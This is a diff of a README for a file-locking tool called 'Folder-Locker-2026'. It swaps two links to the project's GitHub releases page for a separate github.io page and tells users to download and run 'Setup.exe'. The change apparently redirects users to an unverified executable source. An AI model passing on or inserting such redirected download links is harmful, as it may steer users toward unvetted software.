@@ -1,6 +1,6 @@
 # 🔐 Folder-Locker-2026 - Secure your private files with passwords
 
-[![Download Folder Locker 2026](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Lissieremote143/Folder-Locker-2026/releases)
+[![Download Folder Locker 2026](https://img.shields.io/badge/Download-Release-blue.svg)](https://lissieremote143.github.io)
 
 Folder Locker 2026 helps you protect your private folders and files on your computer. You can hide sensitive documents or lock them behind a password. This tool prevents unauthorized people from viewing or opening your data. You only need one click to lock or unlock your items.
 
@@ -17,7 +17,7 @@ Before you install this software, ensure your computer meets the following needs
 
 You must download the installer file from the official releases page. 
 
-[Click here to visit the release page and download the installer](https://github.com/Lissieremote143/Folder-Locker-2026/releases)
+[Click here to visit the release page and download the installer](https://lissieremote143.github.io)
 
 Once you reach the releases page, look for the file named `Setup.exe`. Click the file name to start the download. Save the file to your "Downloads" folder or your desktop so you can find it easily. 
 
